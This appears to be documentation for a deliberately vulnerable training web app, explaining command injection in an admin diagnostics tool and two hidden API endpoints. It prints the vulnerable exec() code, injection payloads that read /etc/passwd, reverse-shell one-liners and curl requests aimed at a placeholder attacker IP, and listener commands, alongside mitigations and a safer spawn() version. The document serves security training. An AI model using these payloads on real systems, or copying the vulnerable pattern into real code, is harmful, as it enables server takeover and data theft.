# Remote Code Execution Vulnerability - Educational Documentation

⚠️ **WARNING: This application contains intentional security vulnerabilities for ethical hacking practice.**

## Overview

This application contains **multiple Remote Code Execution (RCE)** vulnerabilities designed for educational purposes. The primary vulnerability is in the Admin Panel's System Diagnostics feature, but there are additional hidden vulnerabilities for advanced testing.

## Vulnerability Locations

### Primary Vulnerability
**Path:** `/admin` → "System Diagnostics" tab
**Component:** `components/admin/system-diagnostics.tsx`
**API Endpoint:** `/admin/diagnostic` (POST)

### Additional Hidden Vulnerabilities
**API Endpoint:** `/admin/system-info` (GET) - Hidden `cmd` parameter
**API Endpoint:** `/admin/network` (GET) - Command injection in network tools

## Vulnerability Details

### Type: Command Injection (CWE-78)
**Severity:** Critical (CVSS 9.8)

The backend uses Node.js `exec()` function to directly execute shell commands with user-controlled input. The vulnerabilities exist because:

1. **No input sanitization** - User input is directly concatenated into shell commands
2. **Shell metacharacters allowed** - Characters like `;`, `&&`, `|` are not filtered
3. **Full command execution** - Allows execution of arbitrary system commands

### Backend Implementation (Vulnerable Code)
```javascript
// From admin.controller.ts - INTENTIONALLY VULNERABLE
switch (command) {
    case 'ping':
        fullCommand = `ping -c 4 ${target}`;  // Direct injection here!
        break;
    // ... other cases
}

exec(fullCommand, { timeout: 15000 }, (error, stdout, stderr) => {
    // Command execution without validation
});
```

### How to Access

1. **Authentication Required:** You must first gain admin access to the application
2. **Navigate to Admin Panel:** Go to `/admin` (requires admin role)
3. **Access System Diagnostics:** Click on the "System Diagnostics" tab
4. **Exploit the vulnerability:** Use the diagnostic tool with malicious input

### Exploitation Examples

#### Basic Command Injection
In the "Target Host/IP" field, try:
```bash
8.8.8.8; whoami
```

```bash
8.8.8.8 && cat /etc/passwd
```

```bash
8.8.8.8 | id
```

#### Advanced Payloads
```bash
# Multi-command execution
8.8.8.8; whoami; id; pwd

# File system enumeration
8.8.8.8; ls -la /home; cat /etc/hosts

# Process information
8.8.8.8; ps aux | grep -v grep

# Network information
8.8.8.8; netstat -tulpn | head -10
```

#### Reverse Shell Examples
```bash
8.8.8.8; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
```

```bash
8.8.8.8; nc -e /bin/bash YOUR_IP 4444
```

```bash
8.8.8.8; python3 -c "import socket,subprocess;s=socket.socket();s.connect(('YOUR_IP',4444));subprocess.call(['/bin/bash'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())"
```

### Hidden Vulnerabilities

#### 1. System Info Endpoint
**Direct API exploitation:**
```bash
# Hidden cmd parameter allows arbitrary command execution
curl -X GET "http://target:5000/admin/system-info?cmd=whoami" \
     -H "Authorization: Bearer YOUR_TOKEN"

# File system access
curl -X GET "http://target:5000/admin/system-info?cmd=ls%20-la%20/" \
     -H "Authorization: Bearer YOUR_TOKEN"

# Reverse shell via API
curl -X GET "http://target:5000/admin/system-info?cmd=bash%20-i%20%3E%26%20/dev/tcp/YOUR_IP/4444%200%3E%261" \
     -H "Authorization: Bearer YOUR_TOKEN"
```

#### 2. Network Tools Endpoint
```bash
# Command injection in host parameter
curl -X GET "http://target:5000/admin/network?tool=connectivity&host=8.8.8.8;whoami" \
     -H "Authorization: Bearer YOUR_TOKEN"

# Port scanning with injection
curl -X GET "http://target:5000/admin/network?tool=portscan&host=127.0.0.1;id&port=80" \
     -H "Authorization: Bearer YOUR_TOKEN"
```

## Setting Up a Listener

Before attempting reverse shell exploitation, set up a listener on your machine:

```bash
# Using netcat
nc -lvp 4444

# Using socat for better shell
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Using metasploit
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST YOUR_IP; set LPORT 4444; exploit"
```

## Vulnerability Indicators

**Client-side clues:**
- Direct execution warnings in the UI: "⚠️ Note: This tool directly executes system commands on the server"
- Multiple command options (ping, traceroute, nslookup, netstat, ps)
- User-controlled target input field
- Command history showing raw output

**Backend API indicators:**
- Multiple admin endpoints with system interaction
- Error messages revealing system command execution
- Timeout values suggesting command execution
- Response format showing stdout/stderr

**Testing methodology:**
1. Start with simple injection: `; whoami`
2. Test different separators: `&&`, `||`, `|`, `;`
3. Try command substitution: `$(id)`, `` `id` ``
4. Test direct API endpoints with curl
5. Attempt reverse shells if basic injection works

## Real-World Impact

This vulnerability class is extremely dangerous because:
- **Full system access** - Complete control over the server
- **Privilege escalation** - Run commands as the application user
- **Data exfiltration** - Access to files, databases, configuration
- **Lateral movement** - Use compromised server to attack internal networks
- **Persistence** - Install backdoors for continued access

## Mitigation Strategies

### Immediate Fixes:
1. **Input Validation:** Strictly validate all parameters with regex patterns
2. **Command Parameterization:** Use `spawn()` with array arguments instead of `exec()`
3. **Whitelist Commands:** Only allow specific, predefined operations
4. **Sanitization:** Remove or escape all shell metacharacters

### Secure Implementation Example:
```javascript
// SECURE VERSION - Use spawn with array arguments
import { spawn } from 'child_process';

const secureSystemDiagnostic = (command: string, target: string) => {
    // Strict input validation
    const validCommands = ['ping', 'traceroute', 'nslookup'];
    const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
    const hostnameRegex = /^[a-zA-Z0-9.-]+$/;
    
    if (!validCommands.includes(command)) {
        throw new Error('Invalid command');
    }
    
    if (!ipRegex.test(target) && !hostnameRegex.test(target)) {
        throw new Error('Invalid target format');
    }
    
    // Use spawn with array arguments - prevents shell injection
    const args = command === 'ping' ? ['-c', '4', target] : [target];
    const child = spawn(command, args, { timeout: 10000 });
    
    // Handle output safely...
};
```

### Defense in Depth:
1. **Principle of Least Privilege:** Run services with minimal required permissions
2. **Network Segmentation:** Isolate diagnostic tools from critical systems
3. **Monitoring:** Log and monitor all command executions
4. **WAF Rules:** Implement Web Application Firewall rules to detect injection attempts
5. **Container Security:** Use containers to limit blast radius
6. **Regular Security Audits:** Code review and penetration testing

## Learning Objectives

After exploiting this vulnerability, you should understand:

1. **Command Injection Fundamentals:** How unsanitized input leads to RCE
2. **Multiple Attack Vectors:** UI-based and direct API exploitation
3. **Exploitation Techniques:** Various methods to inject and execute commands
4. **Post-Exploitation:** What an attacker can do with command execution
5. **Detection Methods:** How to identify similar vulnerabilities in code and APIs
6. **Remediation Strategies:** How to properly fix command injection issues

## Responsible Disclosure

This is an intentionally vulnerable application for educational purposes. In real-world scenarios:

1. **Never exploit vulnerabilities without permission**
2. **Follow responsible disclosure practices**
3. **Report vulnerabilities to appropriate parties**
4. **Respect legal and ethical boundaries**

## Additional Resources

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [SANS Secure Coding Practices](https://www.sans.org/white-papers/2172/)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)

---

**Remember:** This vulnerability exists solely for educational purposes. Always practice ethical hacking and responsible disclosure in real-world scenarios. 